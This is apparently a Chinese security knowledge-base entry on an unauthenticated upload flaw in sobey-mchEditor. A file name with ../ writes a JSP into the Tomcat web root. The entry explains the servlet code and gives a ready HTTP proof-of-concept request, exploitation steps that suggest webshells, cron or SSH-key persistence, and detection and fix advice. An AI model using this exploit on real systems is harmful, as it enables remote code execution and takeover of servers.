---
id: web-generic-file-upload-sobey-mcheditor-watermark-filename-traversal-jsp
title: 融媒体系统 sobey-mchEditor 水印上传未鉴权 + 文件名穿越写 JSP 进 Web 根
type: scenario
domain: web
path: web/generic/file-upload
technique: sobey-mcheditor-watermark-upload-filename-traversal-jsp
tags:
- web
- file-upload
- java
- servlet
- path-traversal
- webshell
- jsp
- tomcat
- unauth
- sobey
- mcheditor
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:18:13+08:00'
  notes: 已对照原文与图01-06核对；@WebServlet(/watermark/upload)未鉴权、仅剥离反斜杠、name直拼/mntdisk路径、8层../写aaa.jsp回显111均一致；未设置versions；PoC未复跑
url: /docs/web/generic/file-upload/web-generic-file-upload-sobey-mcheditor-watermark-filename-traversal-jsp/
draft: false
kb_aliases:
- /sobey-mchEditor/watermark/upload
- WatermarkUploader 任意文件上传
- 水印上传 getshell
- sobey-mchEditor 文件上传漏洞
- 融媒体系统 upload 路径穿越
- 文件名 ../ 写 JSP
---

## 一句话结论

`POST /sobey-mchEditor/watermark/upload` 由 `WatermarkUploader` servlet 直接处理，没有其他接口要求的 `token` 鉴权；它从 multipart 中取客户端文件名，仅剥离反斜杠形式的前缀，随后把文件名直接拼到 `/mntdisk/upload/Image/mrtp/yyyy/MM/dd/` 后调用 `fileItem.write()`，攻击者用 `../../` 即可跳出上传目录，把 JSP 写入 Tomcat `webapps/sobey-mchEditor/` 并访问执行。

## 原理

- 路由由 `@WebServlet({"/watermark/upload"})` 注册，`WatermarkUploader extends HttpServlet` 的 `service()` 直接处理请求。该系统的其他接口普遍用 `@RequestParam(value = "token", required = true)` 做鉴权，而这个 servlet 不接收也不校验 token，因此未登录可达。
- 上传解析用 `new DiskFileItemFactory()` + `new ServletFileUpload(factory)` + `upload.parseRequest(req)`，返回全部 multipart 项；对每个非表单字段取 `String name = fileItem.getName()`。
- 代码只处理了一种情况：`if (name.contains("\\")) name = name.substring(name.lastIndexOf("\\") + 1)`。这只是剥离 Windows 完整路径中的反斜杠前缀，对 `/` 分隔的 `../` 完全不处理，也不取 basename。
- 落盘路径按日期拼接：`path = "upload/Image/mrtp/" + yyyy/MM/dd`，`filePath = "/mntdisk/" + path`，先 `mkdirs()`，再 `fileItem.write(new File(filePath + "/" + name))`。路径拼接后没有 `normalize()`、没有 `startsWith(uploadDir)` 校验，Java 在打开文件时才解析 `..`，因此名字里的 `../../` 会逐级上溯。
- 上传目录本身不可执行，但 Tomcat 的 `webapps/sobey-mchEditor/` 会编译执行其中的 `.jsp`；穿越把文件从“只能存数据”的目录搬到“可被容器解析且 HTTP 可访问”的目录，形成 RCE。
- 上传接口还设置了 `setFileSizeMax(20480000L)`，只限制大小，不限制扩展名、MIME 或内容。

## 触发条件

- 目标部署了 sobey-mchEditor，`/sobey-mchEditor/watermark/upload` 可达且无需 token。
- Web 进程对 `/mntdisk/upload/Image/mrtp/` 与 Tomcat `webapps/sobey-mchEditor/` 有写权限（通常同一应用账号或 root）。
- 目标使用可解析 JSP 的容器（Tomcat 等），且应用以 exploded 目录或可写 webapps 方式部署。
- 上传目录到目标目录的层级与文件名中的 `../` 数量匹配；目录已存在或能被 `mkdirs()` 创建。

## 利用步骤

1. 确认 `/sobey-mchEditor/watermark/upload` 可未授权访问，先用普通图片上传，观察响应 `{"status":200}` 与记录中的 URL，确认默认落盘目录为 `/mntdisk/upload/Image/mrtp/<年>/<月>/<日>/`。
2. 按目标实际部署路径计算穿越层数。示例从 `/mntdisk/upload/Image/mrtp/2025/07/17/` 到 `/usr/local/tomcat/webapps/sobey-mchEditor/` 需要 8 个 `../`（`17`→`07`→`mrtp`→`Image`→`upload`→`mntdisk`→`/`，再向上两层仍停在根）。
3. 发送 multipart 请求，`filename` 填 `../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/aaa.jsp`，内容用最小 JSP（如 `<% out.print(111); %>`）。
4. 访问 `http://target/sobey-mchEditor/aaa.jsp`，返回 `111` 说明穿越与 JSP 解析都成功。
5. 验证后替换为完整 WebShell 或内存马；也可写到其他可写目录（cron、`authorized_keys`、应用配置）扩展利用。

## PoC

```http
POST /sobey-mchEditor/watermark/upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFdF4ewDa2XzgDK0T
Content-Length: 344

------WebKitFormBoundaryFdF4ewDa2XzgDK0T
Content-Disposition: form-data; name="file"; filename="../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/aaa.jsp"
Content-Type: image/jpeg

<% out.print(111); %>
------WebKitFormBoundaryFdF4ewDa2XzgDK0T--
```

响应：`{"status":200}`；访问 `/sobey-mchEditor/aaa.jsp` 返回 `111`。原文的验证 JSP 还会在执行后删除自身文件，用于证明脚本被容器解析执行。

## 变体与关联

- 变体：Windows 部署用 `..\..\`；`fileItem.getName()` 若返回带盘符的完整路径，反斜杠分支只剥离前缀，仍可用 `/` 穿越。
- 变体：落点改为 Web 根下的 `.jspx`、`.war`，或写 `WEB-INF/classes` 下的 class；也可利用同一写权限覆盖应用配置、计划任务、SSH `authorized_keys`。
- 关联：原始文件名直拼上传目录的通用模式 [[web-generic-file-upload-upload1-filename-traversal-jsp-webroot]]；模板上传 `relativePath` 与原始文件名双参数穿越 [[web-generic-file-upload-template-relative-path-original-filename-arbitrary-write]]；同系统另外两处问题 [[web-generic-xxe-sobey-mcheditor-aitaskback-documentbuilderfactory]]、[[web-generic-sqli-sobey-mcheditor-wxarticlelist-whitelist-bypass]]。
- 边界：保存前取 basename、使用服务端随机文件名、落盘前做 canonical 校验并限制在上传根内、上传目录与 Web 根跨文件系统且目标不可写、容器禁止解析上传目录时，利用失败。

## 检测与防御

- 检测：multipart `filename` 中出现 `../`、`..\`、绝对路径或编码后的 `%2e%2e`；上传请求响应后紧跟对 `/sobey-mchEditor/*.jsp` 的访问；`webapps/sobey-mchEditor/` 下出现新增脚本文件；`watermark` 表出现异常文件名与 URL。
- 修复：上传接口强制 token/登录校验；保存前只取 basename 或完全使用服务端生成的 UUID 文件名；`Path.normalize()` 后校验 `startsWith(uploadDir)`；扩展名白名单 + 内容魔数校验。
- 加固：上传目录移出 Web 根并禁止脚本解析；Web 进程降权，不能写 Tomcat webapps；对 Web 目录新增脚本文件做完整性监控与告警；限制 multipart 大小并记录上传日志。
